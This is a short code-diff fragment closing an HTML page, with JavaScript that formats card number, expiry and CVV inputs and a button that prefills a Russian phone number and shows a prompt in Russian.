+            let value = e.target.value.replace(/\D/g, '');
+            value = value.replace(/(\d{4})/g, '$1 ').trim();
+            e.target.value = value.substring(0, 19);
+        });
+        
+        document.getElementById('cardExpiry')?.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value.substring(0, 5);
+        });
+        
+        document.getElementById('cardCVV')?.addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
+        });
+        
+        // SMS кнопка
+        document.getElementById('smsInterface').addEventListener('click', function() {
+            const phone = document.getElementById('phone');
+            if (!phone.value.trim()) {
+                phone.value = '+7 999 ';
+                phone.focus();
+            }
+            showNotification('✅ Номер подставлен в форму. Заполните остальные данные.');
+        });
+    </script>
+</body>
+</html>
